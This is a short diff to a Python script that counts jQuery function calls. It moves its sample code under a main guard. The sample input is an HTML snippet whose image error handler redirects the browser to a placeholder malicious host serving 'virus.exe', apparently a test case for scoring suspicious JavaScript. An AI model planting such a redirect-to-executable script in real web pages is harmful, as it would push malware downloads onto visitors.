@@ -33,15 +33,16 @@ def calculate_score(js_content: str) -> int:
     return all_count
 
 
-# 示例代码
-code = """
-<img alt="Book" id="book" scr="www.invalidaddress.com"/>
-<script>
-$('#book').error(function() {
-window.location.href = 'http://maliciousWebsite.com/virus.exe';
-})
-</script>
-"""
+if __name__ == "__main__":
+    # 示例代码
+    code = """
+    <img alt="Book" id="book" scr="www.invalidaddress.com"/>
+    <script>
+    $('#book').error(function() {
+    window.location.href = 'http://maliciousWebsite.com/virus.exe';
+    })
+    </script>
+    """
 
-res = calculate_score(code)
-print(f"jQuery functions count: {res}")
+    res = calculate_score(code)
+    print(f"jQuery functions count: {res}")
